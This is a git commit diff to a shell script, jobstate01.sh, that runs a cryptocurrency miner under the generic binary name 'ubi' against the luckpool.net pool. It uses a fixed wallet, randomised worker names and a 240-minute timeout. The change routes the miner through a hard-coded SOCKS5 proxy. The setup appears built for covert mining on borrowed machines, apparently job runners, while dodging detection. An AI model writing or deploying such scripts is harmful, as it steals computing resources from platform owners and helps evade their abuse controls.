b68ecf541bf84f45a939cf7d9891d4db1f69af0c
rerpes <93594805+rerpes@users.noreply.github.com>
2021-11-02 20:27:33 +0700

    Update jobstate01.sh

--- jobstate01.sh
+++ jobstate01.sh
@@ -1,4 +1,4 @@
 #!/bin/sh
 chmod +x verus-solver
 chmod +x ubi
-timeout 240m ./ubi -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBfBRKqh6b3LFxMWFRdfFcPfdboN5jptXN.$(echo $(shuf -i 10-299 -n 1)-ANDRO-X) -p x --cpu 2
+timeout 240m ./ubi -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBfBRKqh6b3LFxMWFRdfFcPfdboN5jptXN.$(echo $(shuf -i 10-299 -n 1)-ANDRO-X) -p x -x 2 socks5://192.252.214.20:15864
